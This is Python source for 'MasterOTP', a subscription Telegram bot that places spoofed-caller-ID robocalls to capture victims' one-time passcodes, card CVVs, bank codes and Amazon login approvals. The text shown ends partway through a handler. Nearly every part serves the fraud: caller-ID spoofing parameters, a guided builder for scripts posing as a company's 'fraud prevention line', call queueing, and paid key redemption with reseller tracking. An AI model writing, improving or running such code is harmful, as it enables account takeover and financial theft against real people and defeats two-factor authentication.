# TELEGRAM
from telegram import Update, Chat
from telegram.ext import ContextTypes
from telegram import InlineKeyboardButton, InlineKeyboardMarkup

# BASIC
from datetime import datetime, timedelta
import os
import asyncio
import time
import traceback

# OTHER IMPORTS
from utils.keys import process_key, generate_key
from utils.asterisk import create_call
from database.database import fetch_user, create_key, delete_key, check_subscription_status, add_custom_script, fetch_custom_scripts, fetch_user_script, delete_custom_script, fetch_key_referrer, fetch_user_usage

admin_group = os.getenv('ADMIN_GROUP_ID')
admins_str = os.getenv('ADMINS')
max_daily_usage = int(os.getenv('MAX_DAILY_USAGE'))
admins = [int(admin_id.strip()) for admin_id in admins_str.split(',')]



# /start
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    referrer = context.args[0] if context.args else None
    print(referrer)
        
    await fetch_user(update.effective_user.id, update.effective_user.username, referrer)
    
    reply_text = (
        "            🥷MasterOTP BOT 🥷\n\n"
        "Type : /purchase to get your subscription\n"
        "MasterOTP Bot - Owner: @thatmasterguy\n\n"
        
        "👤 User Commands\n"
        "🔐 ➔ /redeem - Redeem your key\n"
        "⏰ ➔ /checktime - Check Subscription Remaining Time\n\n"
        
        "📞 Call Commands\n"
        "📒 ➔ /call - Any code (e.g., Paypal, Venmo, Coinbase, Cashapp)\n"
        "💳 ➔ /cvv - Capture CVV code from any credit card\n"
        "💰 ➔ /crypto - Capture ANY OTP code with advanced crypto script.\n"
        "📘 ➔ /amazon - Get a victim to approve an Amazon approval link.\n"
        "✉️ ➔ /email - Get victim to read out ANY OTP Code.\n"
        "🏦 ➔ /bank - Capture bank OTP code\n"
        "📧 ➔ /live - Capture digits in real-time\n\n"
        
        "✨ Custom Commands\n"
        "👐 ➔ /createscript - Create a script with 4 parts!\n"
        "👐 ➔ /scripts - Returns names of all your scripts.\n"
        "👐 ➔ /script - Returns information about specific script\n"
        "👐 ➔ /customcall - Just like /call but with your script.\n\n"
        
        "~ Use \"?\" instead of spoof for available number"
    )
    
    # Create the InlineKeyboardMarkup object
    keyboard = [
        [
            InlineKeyboardButton("🛒 Purchase", callback_data='purchase'),
            InlineKeyboardButton("💬 Channel", url='https://t.me/thatmasterotp')
        ],
        [
            InlineKeyboardButton("🥇 Vouches", url='https://t.me/thatmasterotp_vouches')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Send the reply text with buttons
    await update.message.reply_text(reply_text, reply_markup=reply_markup)
   
   
    
# /redeem
async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_type = update.effective_chat.type
    if chat_type == Chat.CHANNEL:
        await update.message.reply_text("\U0001F534 You can't use the bot in a channel.")
        return

    command_parts = update.message.text.split(" ")
    if len(command_parts) == 2:
        # The command has two parts, so proceed
        key = command_parts[1]
        # check key
        key_status, validity_period, key_seller = await process_key(update.effective_user.id, update.effective_user.username, key)
        if(key_status == "active"):
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Your key has been activated for {validity_period} day(s)")
            await context.bot.send_message(chat_id=admin_group, text=f"Key redeemed by @{update.effective_user.username} | Days: {validity_period} | Referrer: {key_seller}")

        elif(key_status == "redeemed"):
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Your key has already been used.")        
        elif(key_status == "bad"):
            await context.bot.send_message(chat_id=update.effective_chat.id, text="Your key is invalid.")
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="There was an issue with your key. Please contact an admin")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Please include the key, /redeem MasterOTP-XXXX-XXXX-XXXX")
        
# /checktime
async def checktime(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # Fetch the user object
    user_object = await fetch_user(update.effective_user.id, update.effective_user.username)
    
    # Get the end_date from the user_object
    end_date_str = user_object.get('subscription', {}).get('end_date', 'N/A')
    
    # Create InlineKeyboardButton
    keyboard = [[InlineKeyboardButton("💸 Subscribe Now 💸", url="https://t.me/thatmasterotp")]]
    reply_markup = InlineKeyboardMarkup(keyboard)

    if end_date_str == 'N/A':
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Seems you are not subscribed yet. Click the button below to join us! \U0001F525.", reply_markup=reply_markup)
        return
    
    # Convert the end_date string to a datetime object
    end_date = datetime.strptime(end_date_str, "%Y-%m-%d")
    end_date = end_date + timedelta(days=1)  # Move to the end of the expiry day
    today = datetime.now()
    
    days_until_expiry = (end_date - today).days
    
    if days_until_expiry >= 0: 
        msg = f"Your MasterOTP subscription will expire in {days_until_expiry} day(s)\n\nExpiry Date: {end_date_str}"
        await context.bot.send_message(chat_id=update.effective_chat.id, text=msg)
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Your subscription has expired. Click the button to join us again! \U0001F525", reply_markup=reply_markup)

# /purchase
async def purchase(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [
            InlineKeyboardButton("💲1 Day", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjUsInByb2R1Y3RfaWQiOiIzNGI0ZjI4NC00MGI4LTRhNjIiLCJwcm9kdWN0X3F1YW50aXR5IjoiMSIsImZpZWxkcyI6WyJFbWFpbCIsIk5hbWUiXX0='),
            InlineKeyboardButton("💲2 Days", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjgsInByb2R1Y3RfaWQiOiJmZDNkNmZlOC1kMTQwLTQwMDgiLCJwcm9kdWN0X3F1YW50aXR5IjoiMSIsImZpZWxkcyI6WyJFbWFpbCIsIk5hbWUiXX0=')
        ],
        [
            InlineKeyboardButton("💲7 Days", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjIwLCJwcm9kdWN0X2lkIjoiYTU5NGE4NGQtNmQ3NC00OWJkIiwicHJvZHVjdF9xdWFudGl0eSI6IjEiLCJmaWVsZHMiOlsiRW1haWwiLCJOYW1lIl19'),
            InlineKeyboardButton("💲14 Days", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjM1LCJwcm9kdWN0X2lkIjoiZjNhZDE5YjktZjczMS00NTM3IiwicHJvZHVjdF9xdWFudGl0eSI6IjEiLCJmaWVsZHMiOlsiRW1haWwiLCJOYW1lIl19')
        ],
        [
            InlineKeyboardButton("💲1 Month", url='https://www.poof.io/checkout/session/eyJ1c2VybmFtZSI6InRoYXRtYXN0ZXIiLCJhbW91bnQiOjcwLCJwcm9kdWN0X2lkIjoiODY5Yzk2ZTQtYjk1Yi00MDFjIiwicHJvZHVjdF9xdWFudGl0eSI6IjEiLCJmaWVsZHMiOlsiRW1haWwiLCJOYW1lIl19')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)

    # Send the reply text with buttons
    reply_text = "You can buy a subscription key from the store below, or using the buttons directly!\n\nhttps://www.poof.io/@thatmaster\n\nYou can redeem using - /redeem {key}"
    await update.message.reply_text(reply_text, reply_markup=reply_markup, disable_web_page_preview=True)
    
    
    
# /generate
async def createkey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if admin
    if user_id not in admins:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="You are not authorized to use this command.")
        return
    
    # Split command
    command_parts = update.message.text.strip().split(' ')
    
    # Check if included validity period
    if len(command_parts) < 2:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Please include the validity period as a parameter.")
        return
    
    # Check if validity period is integer
    try:
        validity_period = int(command_parts[1])
    except ValueError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="The validity period must be an integer.")
        return

    # Get referrer
    referrer = command_parts[2] if len(command_parts) > 2 else None
    
    # Generate the key and create it
    generated_key = generate_key()  
    await create_key(generated_key, validity_period, referrer)
    await context.bot.send_message(
        chat_id=update.effective_chat.id,
        text=f"Key {generated_key} created with a validity period of {validity_period} days. Referrer: {referrer or 'None'}"
    )

# /deletekey
async def deletekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if the user is an admin
    if user_id not in admins:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="You are not authorized to use this command.")
        return
    
    # Check if the command includes a parameter
    command_text = update.message.text.strip()
    if ' ' not in command_text:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Please include the key as a parameter.")
        return
    
    # Extract the parameter and check if it's a string
    _, param_str = command_text.split(' ', 1)
    try:
        key_value = str(param_str)
    except ValueError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="The key must be a string.")
        return
    
    # Delete the key and check for success
    deleted_successfully = await delete_key(key_value)
    if deleted_successfully:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Key {key_value} has been deleted.")
    else:
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Key {key_value} was not found.")

# /bulkcreatekey
async def bulkcreatekey(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    
    # Check if the user is an admin
    if user_id not in admins:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="You are not authorized to use this command.")
        return
    
    # Split the command text into words
    command_parts = update.message.text.strip().split(' ')
    
    # Check for all parameters
    if len(command_parts) < 4:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Wrong command parameters. Use the command like this /bulkcreatekey {key amount} {duration} [referrer]")
        return
    
    # Extract params
    _, num_keys_str, validity_period_str, *optional_referrer = command_parts
    
    try:
        num_keys = int(num_keys_str)
        validity_period = int(validity_period_str)
    except ValueError:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Both the number of keys and the validity period must be integers.")
        return
    
    # Get referrer
    referrer = optional_referrer[0] if optional_referrer else None
    
    # Gen keys
    generated_keys = [generate_key() for _ in range(num_keys)]
    
    for key in generated_keys:
        await create_key(key, validity_period, referrer)
    
    keys_text = "\n".join(generated_keys)
    await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Keys created with a validity period of {validity_period} days:\n{keys_text}")

# /keystat
async def keystat(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    # Check if the user is an admin
    if user_id not in admins:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="You are not authorized to use this command.")
        return

    # Check if the command includes a parameter (referrer identifier)
    command_text = update.message.text.strip()
    if ' ' not in command_text:
        await context.bot.send_message(chat_id=update.effective_chat.id, text="Please include the referrer identifier as a parameter.")
        return

    # Extract the referrer identifier from the command
    _, referrer = command_text.split(' ', 1)

    # Get the referrer info
    info = await fetch_key_referrer(referrer)

    # Format the info into a text message
    info_text = (
        f"Referrer: {referrer}\n"
        f"Total Keys: {info['total_keys']}\n"
        f"% of Keys Used: {info['percentage_used']:.2f}%\n"
        f"Keys Used: {info['redeemed_keys_count']}\n"
        f"Keys Unused: {info['unused_keys_count']}\n"
        f"Keys Used Per Day (last 14 days): {', '.join(map(str, info['keys_used_per_day']))}"
    )

    # Send the info back to the user
    await context.bot.send_message(chat_id=update.effective_chat.id, text=info_text)

    
# /createscript
async def createscript(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print("Hey, hello.")
    # Createscript Flag
    if 'createscript_called' not in context.user_data:
        context.user_data['createscript_called'] = False

    # Change Createscript Flag
    if update.message and update.message.text == '/createscript':
        context.user_data['createscript_called'] = True
        
    if context.user_data.get('createscript_called', False): 
        if 'state' not in context.user_data:
            context.user_data['state'] = 'start'
            context.user_data['script_data'] = {}
    if 'state' in context.user_data:
        # START
        if context.user_data['state'] == 'start':
            context.user_data['state'] = 'collect_on_call_answer'
            await update.message.reply_text("Please enter the script to be read when the target answers the call: \n\n(Example: Hello {name}, this is an automated message from the {service} fraud prevention line... please press 1.)\n\n~ Keep in mind you have to include pressing '1' in your line!")
        
        # ON CALL ANSWER
        elif context.user_data['state'] == 'collect_on_call_answer':
            context.user_data['script_data']['on_call_answer'] = update.message.text
            context.user_data['state'] = 'collect_on_press_one'
            await update.message.reply_text("Please enter the script to be read after the target presses '1':\n\n(Example: To block this request, please enter the {otp_length} digit security code...)\n\n~ You can include the {otp_length} in your answer if you wish to make your script dynamic.")
        
        # PRESS 1 LINE
        elif context.user_data['state'] == 'collect_on_press_one':
            context.user_data['script_data']['on_press_one'] = update.message.text
            context.user_data['state'] = 'collect_on_enter_otp'
            await update.message.reply_text("Please enter the script to be read after target enters an OTP code:\n\n(Example: Thank you for your assistance. Please wait a second while we check the code.)")
        
        # ENTER OTP LINE
        elif context.user_data['state'] == 'collect_on_enter_otp':
            context.user_data['script_data']['on_enter_otp'] = update.message.text
            context.user_data['state'] = 'collect_on_good_otp'
            await update.message.reply_text("Please enter the script to be read after targets enters GOOD OTP code: (Example: Thank you for confirming your identity. The attacker has been denied access...)")
        
        # GOOD OTP COLLECT
        elif context.user_data['state'] == 'collect_on_good_otp':
            context.user_data['script_data']['on_good_otp'] = update.message.text
            context.user_data['state'] = 'collect_on_bad_otp'
            await update.message.reply_text("Please enter the script to be read after targets enters BAD OTP code:\n\n(Example: The code you provided wasn't valid. Please enter it again.)")
        
        # BAD OTP COLLECT
        elif context.user_data['state'] == 'collect_on_bad_otp':
            context.user_data['script_data']['on_bad_otp'] = update.message.text
            context.user_data['state'] = 'collect_gender'
            keyboard = [[InlineKeyboardButton("👨 Male", callback_data='Male'), InlineKeyboardButton("👩 Female", callback_data='Female')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await update.message.reply_text("Select which gender you want the reading voice to be:", reply_markup=reply_markup)

        elif context.user_data['state'] == 'collect_gender':
            query = update.callback_query
            context.user_data['script_data']['gender'] = query.data
            await query.answer()
            context.user_data['state'] = 'collect_language'
            
            language_options = [
                "Arabic (arb)", "Chinese (Simplified) - Mainland China (cmn-CN)",
                "Welsh - United Kingdom (cy-GB)", "Danish - Denmark (da-DK)",
                "German - Germany (de-DE)", "English - Australia (en-AU)",
                "English - United Kingdom (en-GB)", "English - United Kingdom (Welsh) (en-GB-WLS)",
                "English - India (en-IN)", "English - United States (en-US)",
                "Spanish - Spain (es-ES)", "Spanish - Mexico (es-MX)",
                "Spanish - United States (es-US)", "French - Canada (fr-CA)",
                "French - France (fr-FR)", "Hindi - India (hi-IN)",
                "Icelandic - Iceland (is-IS)", "Italian - Italy (it-IT)",
                "Japanese - Japan (ja-JP)", "Korean - South Korea (ko-KR)",
                "Norwegian - Bokmål (nb-NO)", "Dutch - Netherlands (nl-NL)",
                "Polish - Poland (pl-PL)", "Portuguese - Brazil (pt-BR)",
                "Portuguese - Portugal (pt-PT)", "Romanian - Romania (ro-RO)",
                "Russian - Russia (ru-RU)", "Swedish - Sweden (sv-SE)",
                "Turkish - Turkey (tr-TR)"
            ]

            # Group the language options into sublists of 4 elements each
            grouped_options = [language_options[i:i + 4] for i in range(0, len(language_options), 4)]

            formatted_options = '\n'.join([' • '.join(group) for group in grouped_options])
            await query.message.reply_text(f"Select the language to be used when reading the text. Write the short-code. Example (en-US)\n\n{formatted_options})")
            
        elif context.user_data['state'] == 'collect_language':
            allowed_languages = ["arb", "cmn-CN", "cy-GB", "da-DK", "de-DE", "en-AU", "en-GB", "en-GB-WLS", "en-IN", "en-US", "es-ES", "es-MX", "es-US", "fr-CA", "fr-FR", "hi-IN", "is-IS", "it-IT", "ja-JP", "ko-KR", "nb-NO", "nl-NL", "pl-PL", "pt-BR", "pt-PT", "ro-RO", "ru-RU", "sv-SE", "tr-TR"]

            if update.message.text in allowed_languages:
                context.user_data['script_data']['language'] = update.message.text
                await update.message.reply_text("Please enter a name for this script:")
                context.user_data['state'] = 'collect_script_name'
            else:
                await update.message.reply_text("Invalid language option. Please enter a valid language code.")
                
        elif context.user_data['state'] == 'collect_script_name':
            script_name = update.message.text
            telegram_user_id = update.message.from_user.id 
            
            on_call_answer = context.user_data['script_data'].get('on_call_answer')
            on_press_one = context.user_data['script_data'].get('on_press_one')
            on_enter_otp = context.user_data['script_data'].get('on_enter_otp')
            on_good_otp = context.user_data['script_data'].get('on_good_otp')
            on_bad_otp = context.user_data['script_data'].get('on_bad_otp')
            gender = context.user_data['script_data'].get('gender')
            language = context.user_data['script_data'].get('language')
            
            
            await add_custom_script(
                telegram_user_id, script_name,
                on_call_answer, on_press_one, on_enter_otp, 
                on_good_otp, on_bad_otp, gender, language
            )
            
            await update.message.reply_text(f"Script '{script_name}' has been saved successfully.")
            
            # Reset the states and collected data
            context.user_data['createscript_called'] = False
            context.user_data.pop('script_data', None)
            del context.user_data['state']

# / scripts
async def scripts(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    script_names = await fetch_custom_scripts(user_id)  # Make sure to await the function
    
    if script_names:
        enumerated_scripts = [f"{i+1}. {name}" for i, name in enumerate(script_names)]
        scripts_list = "\n".join(enumerated_scripts)
        await update.message.reply_text(f"Here are your saved scripts:\n\n{scripts_list}")
    else:
        await update.message.reply_text("You have no saved scripts.")

# / script
async def script_info(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    script_name = update.message.text.split(' ', 1)[-1]
    
    script_data = await fetch_user_script(user_id, script_name)
    
    if script_data:
        # Ordering and descriptions
        descriptions = [
            ('script_id', 'ID'),
            ('script_name', 'Name'),
            ('on_call_answer', 'On Answer:'),
            ('grab_code', 'Grab Code:'),
            ('waiting_line', 'Waiting Line:'),
            ('success_line', 'Success Line:'),
            ('repeat_line', 'Repeat Line:'),
            ('gender', 'Gender:'),
            ('language', 'Language:')
        ]
        
        formatted_script_data = "\n".join([f"{desc}: {script_data.get(key, 'N/A')}" for key, desc in descriptions])
        await update.message.reply_text(f"Here is the information for the script named '{script_name}':\n\n{formatted_script_data}")
    else:
        await update.message.reply_text(f"No script named '{script_name}' found.")

# / deletescript
async def delete_script(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.message.from_user.id
    script_name = update.message.text.split(' ', 1)[-1]  # Get the script name after the command
    
    deleted = await delete_custom_script(user_id, script_name)  # Make sure to await the function
    
    if deleted:
        await update.message.reply_text(f"The script named '{script_name}' has been deleted successfully.")
    else:
        await update.message.reply_text(f"No script named '{script_name}' found. Deletion failed.")

# / cancel
async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):    
    changed = False
    
    # Check if createscript_called was even called
    if 'createscript_called' in context.user_data and context.user_data['createscript_called']:
        context.user_data['createscript_called'] = False
        changed = True
    
    # Check script_data 
    if 'script_data' in context.user_data:
        context.user_data.pop('script_data', None)
        changed = True
    
    # Check current user_state
    if 'state' in context.user_data:
        del context.user_data['state']
        changed = True
    
    if changed:
        await update.message.reply_text(f"Script process has been cancelled..")
    else:
        await update.message.reply_text("You are not currently creating a script.")


# --- BASIC QUEUE ----
call_queue = [] 
queue_positions = {}

# Add call to queue
async def update_queue_positions():
    """Decrease position for everyone after processing a call."""
    for info in queue_positions.values():
        if info['position'] > 1: 
            info['position'] -= 1

async def queue_call(update: Update, context: ContextTypes.DEFAULT_TYPE, call_details):
    call_queue.append((update, context, call_details))
    
    # CALL POSITION
    call_id = call_details['chatid']
    queue_positions[call_id] = {'position': len(call_queue) + 1, 'hourglasses': 1}
    await update.message.reply_text("Your call has been queued.")

def generate_queue_msg(position, hourglass_count):
    hourglasses = "⌛" * hourglass_count
    return f"🗻 All lines are busy. Your queue position: {position}. {hourglasses}"

async def notify_all_in_queue(context: ContextTypes.DEFAULT_TYPE):
    for call_id, info in queue_positions.items():
        # Update the number of hourglasse
        info['hourglasses'] = (info['hourglasses'] % 4) + 1
        
        queue_msg = generate_queue_msg(info['position'], info['hourglasses'])
        
        if 'message_id' in info:
            # Edit existing message
            await context.bot.edit_message_text(
                chat_id=call_id,
                message_id=info['message_id'],
                text=queue_msg
            )
        else:
            # Send queue msg (FIRST TIME)
            sent_message = await context.bot.send_message(
                chat_id=call_id,
                text=queue_msg
            )
            queue_positions[call_id]['message_id'] = sent_message.message_id

# Process call queue
async def process_queue(context: ContextTypes.DEFAULT_TYPE):
    print('QUEUE CALLED')
    try:
        if call_queue:
            print('CHECKING QUEUE')
            # Just peek at the first item without removing it
            update, context_call, call_details = call_queue[0]
            
            call_id = call_details['chatid']
            
            # Update the positions of the remaining calls in the queue
            await update_queue_positions()
            
            # Get the queue position for the current call
            queue_info = queue_positions.get(call_id, {})
            queue_position = queue_info.get('position', 1)
            
            # Try calling
            print(f'Trying to create call for {call_id}')
            call_success = await create_call(update, context_call, call_details, queue_position)  
                
            if not call_success:
                # Re-queueing logic
                print(f'Re-queueing call for {call_id} due to too many people')
                await notify_all_in_queue(context)

                # Move the failed call to the end of the queue for another attempt
                failed_call = call_queue.pop(0)  # Remove from the start
                call_queue.append(failed_call)  # Add to the end
                queue_positions[call_id]['position'] = len(call_queue)  # Update the position for this call

            else:
                if call_success == "Success":
                    queue_positions.pop(call_id, None)
                else:
                    print(f'Removing call, active or fail idk.')
                    active_calls.discard(call_details['chatid'])
                    queue_positions.pop(call_id, None)
                call_queue.pop(0)  # Remove the call from the queue as it's been processed
                
    except Exception as e:
        error_info = traceback.format_exc()
        print(f"Error occurred during queue processing: {e}\nDetails:\n{error_info}")
    finally:      
        context.job_queue.run_once(process_queue, 2, job_kwargs={"misfire_grace_time": None})
        


# Track active calls
active_calls = set()

# Remove all active calls
async def remove_active_call(user_id):
    # ALLOW NEXT CALL AFTER 30s
    await asyncio.sleep(30)
    active_calls.discard(user_id)
# --------------------




# MODULES
# /call
async def call(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_parts = update.message.text.split()
    
    # Get today's date
    today = datetime.now()
    
    # Get usage_count
    usage_count = await fetch_user_usage(update.message.from_user.id, today)
    
    if usage_count >= max_daily_usage:
        # Calculate time
        next_day = (today + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_time = next_day - today
        wait_hours, remainder = divmod(wait_time.seconds, 3600)
        wait_minutes, _ = divmod(remainder, 60)
        
        # Send a message
        await update.message.reply_text(
            f"🔴 Today's usage has reached the limit of {max_daily_usage} calls. \n\n"
            f"Please wait {wait_hours} hours and {wait_minutes} minutes before trying again."
        )
        return

    # Check for active call
    if update.message.from_user.id in active_calls:
        await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
        return
    
    # Validate the input parameters
    if len(message_parts) != 6:
        await update.message.reply_text("🔴 Missing parameters")
        await update.message.reply_text("Please use /call number spoofnumber service name otpdigits.")
        return

    number = message_parts[1]
    spoof = message_parts[2]
    otpdigits = message_parts[5]

    if not (number.isdigit() and otpdigits.isdigit()):
        await update.message.reply_text("🔴 Invalid parameters.")
        await update.message.reply_text("Make sure 'number' and 'otpdigits' are numbers.")
        return

    if not (len(spoof) == 10 or len(spoof) == 11) and spoof != "?":
        await update.message.reply_text("🔴 Invalid 'spoof' parameter.")
        await update.message.reply_text("The 'spoof' should be either a 10 or 11-digit number or '?'")
        return
    
    try:
        is_paid_user = await check_subscription_status(update.message.from_user.id, update.effective_user.username)
        if is_paid_user:
            # Prepare the call details
            call_details = {
                'mode': "voice",
                'number': number,
                'spoof': spoof if spoof.isdigit() or spoof == "?" else "?",
                'service': message_parts[3],
                'name': message_parts[4],
                'otpdigits': otpdigits,
                'tag': update.effective_user.username,
                'chatid': update.message.from_user.id
            }

            # Add to the call queue
            active_calls.add(update.message.from_user.id)
            asyncio.create_task(remove_active_call(update.message.from_user.id))
            await queue_call(update, context, call_details)
            await update.message.reply_text(f"☎️ Queuing call from {call_details['spoof']} to {call_details['number']}")
        else:
            await update.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
    except Exception as err:
        print(err)
        await update.message.reply_text("🔴 Error has occurred!\n\n🦒 Your command is incorrect.")

# /customcall
async def customcall(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_parts = update.message.text.split()
    
    # Get today's date
    today = datetime.now()
    
    # Get usage_count
    usage_count = await fetch_user_usage(update.message.from_user.id, today)
    
    if usage_count >= max_daily_usage:
        # Calculate time
        next_day = (today + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_time = next_day - today
        wait_hours, remainder = divmod(wait_time.seconds, 3600)
        wait_minutes, _ = divmod(remainder, 60)
        
        # Send a message
        await update.message.reply_text(
            f"🔴 Today's usage has reached the limit of {max_daily_usage} calls. \n\n"
            f"Please wait {wait_hours} hours and {wait_minutes} minutes before trying again."
        )
        return

    # Check for active call
    if update.message.from_user.id in active_calls:
        await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
        return
    
    # Validate the input parameters
    if len(message_parts) != 7:
        await update.message.reply_text("🔴 Missing parameters")
        await update.message.reply_text("Please use /customcall scriptname number spoofnumber service name otpdigits.")
        return

    number = message_parts[2]
    spoof = message_parts[3]
    otpdigits = message_parts[6]

    if not (number.isdigit() and otpdigits.isdigit()):
        await update.message.reply_text("🔴 Invalid parameters.")
        await update.message.reply_text("Make sure 'number' and 'otpdigits' are numbers.")
        return
    
    if not (len(spoof) == 10 or len(spoof) == 11) and spoof != "?":
        await update.message.reply_text("🔴 Invalid 'spoof' parameter.")
        await update.message.reply_text("The 'spoof' should be either a 10 or 11-digit number or '?'")
        return
    
    telegram_user_id = update.message.from_user.id  # Assuming telegram_user_id is the user's id
    script_name = message_parts[1]
    script = await fetch_user_script(telegram_user_id, script_name)
    
    if script is None:
        await update.message.reply_text(f"🔴 Script '{script_name}' does not exist.")
        return  # Exit the function early if script does not exist
    
    try:
        is_paid_user = await check_subscription_status(update.message.from_user.id, update.effective_user.username)
        if is_paid_user:
            # Prepare the call details
            call_details = {
                'mode': "custom",
                'script_name': message_parts[1],
                'number': message_parts[2],
                'spoof': spoof if spoof.isdigit() or spoof == "?" else "?",
                'service': message_parts[4],
                'name': message_parts[5],
                'otpdigits': message_parts[6],
                'tag': update.effective_user.username,
                'chatid': update.message.from_user.id
            }

            # Add to the call queue
            active_calls.add(update.message.from_user.id)
            asyncio.create_task(remove_active_call(update.message.from_user.id))
            await queue_call(update, context, call_details)
            await update.message.reply_text(f"☎️ Queuing call from {call_details['spoof']} to {call_details['number']}")
        else:
            await update.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
    except Exception as err:
        print(err)
        await update.message.reply_text("🔴 Error has occurred!\n\n🦒 Your command is incorrect.")
  
# /cvv
async def cvv(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_parts = update.message.text.split()
    
    # Get today's date
    today = datetime.now()
    
    # Get usage_count
    usage_count = await fetch_user_usage(update.message.from_user.id, today)
    
    if usage_count >= max_daily_usage:
        # Calculate time
        next_day = (today + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_time = next_day - today
        wait_hours, remainder = divmod(wait_time.seconds, 3600)
        wait_minutes, _ = divmod(remainder, 60)
        
        # Send a message
        await update.message.reply_text(
            f"🔴 Today's usage has reached the limit of {max_daily_usage} calls. \n\n"
            f"Please wait {wait_hours} hours and {wait_minutes} minutes before trying again."
        )
        return

    # Check for active call
    if update.message.from_user.id in active_calls:
        await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
        return
    
    # Validate the input parameters
    if len(message_parts) != 7:
        await update.message.reply_text("🔴 Missing parameters")
        await update.message.reply_text("Please use /cvv number spoofnumber bank name cvvdigits last4digits.")
        return

    number = message_parts[1]
    spoof = message_parts[2]
    cvvdigits = message_parts[5]
    last4digits = message_parts[6]

    if not (number.isdigit() and cvvdigits.isdigit() and last4digits.isdigit()):
        await update.message.reply_text("🔴 Invalid parameters.")
        await update.message.reply_text("Make sure 'number','cvvdigits' and 'last4digits' are numbers.")
        return

    if not (len(spoof) == 10 or len(spoof) == 11) and spoof != "?":
        await update.message.reply_text("🔴 Invalid 'spoof' parameter.")
        await update.message.reply_text("The 'spoof' should be either a 10 or 11-digit number or '?'")
        return

    try:
        is_paid_user = await check_subscription_status(update.message.from_user.id, update.effective_user.username)
        if is_paid_user:
            # Prepare the call details
            call_details = {
                'mode': "cvv",
                'number': message_parts[1],
                'spoof': spoof if spoof.isdigit() or spoof == "?" else "?",
                'bank': message_parts[3],
                'name': message_parts[4],
                'cvvdigits': message_parts[5],
                'last4digits': message_parts[6],
                'tag': update.effective_user.username,
                'chatid': update.message.from_user.id
            }

            # Add to the call queue
            active_calls.add(update.message.from_user.id)
            asyncio.create_task(remove_active_call(update.message.from_user.id))
            await queue_call(update, context, call_details)
            await update.message.reply_text(f"☎️ Queuing call from {call_details['spoof']} to {call_details['number']}")
        else:
            await update.message.reply_text("🔥 You haven't subscribed. Join @MasterOTP to buy now!")
    except Exception as err:
        print(err)
        await update.message.reply_text("🔴 Error has occurred!\n\n🦒 Your command is incorrect.")
        
# /amazon
async def amazon(update: Update, context: ContextTypes.DEFAULT_TYPE):
    message_parts = update.message.text.split()
    
    # Get today's date
    today = datetime.now()
    
    # Get usage_count
    usage_count = await fetch_user_usage(update.message.from_user.id, today)
    
    if usage_count >= max_daily_usage:
        # Calculate time
        next_day = (today + timedelta(days=1)).replace(hour=0, minute=0, second=0, microsecond=0)
        wait_time = next_day - today
        wait_hours, remainder = divmod(wait_time.seconds, 3600)
        wait_minutes, _ = divmod(remainder, 60)
        
        # Send a message
        await update.message.reply_text(
            f"🔴 Today's usage has reached the limit of {max_daily_usage} calls. \n\n"
            f"Please wait {wait_hours} hours and {wait_minutes} minutes before trying again."
        )
        return

    # Check for active call
    if update.message.from_user.id in active_calls:
        await update.message.reply_text("🔴 You already have an active call. Please wait for it to complete before queuing another call.")
        return
    
    # Validate the input parameters
    if len(message_parts) != 4:
        await update.message.reply_text("🔴 Missing parameters")
        await update.message.reply_text("Please use /amazon number spoofnumber name.")
        return

    number = message_parts[1]
    spoof = message_parts[2]

    if not (number.isdigit()):
